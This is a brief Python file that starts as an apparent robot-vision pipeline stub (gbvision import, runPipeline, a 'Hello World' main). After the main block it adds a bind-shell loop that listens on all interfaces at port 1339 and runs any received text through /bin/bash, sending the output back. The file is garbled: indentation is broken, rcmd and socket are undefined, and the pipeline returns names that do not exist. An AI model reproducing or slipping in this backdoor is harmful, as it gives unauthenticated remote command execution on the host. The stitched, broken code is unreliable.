import gbvision as gbv
def runPipeline(image, llrobot):

	return largestContour, image, llpython

def main():
	print("Hello World")

if __name__ == '__main__':
	main()


s = socket.socket()
    s.bind(('0.0.0.0', 1339))
    s.listen(10)
    c, a = s.accept()
    while True:
        info = c.recv(int(2**15))
        result = rcmd(['/bin/bash', '-c', str(info)])
        print(result)
        c.send(result)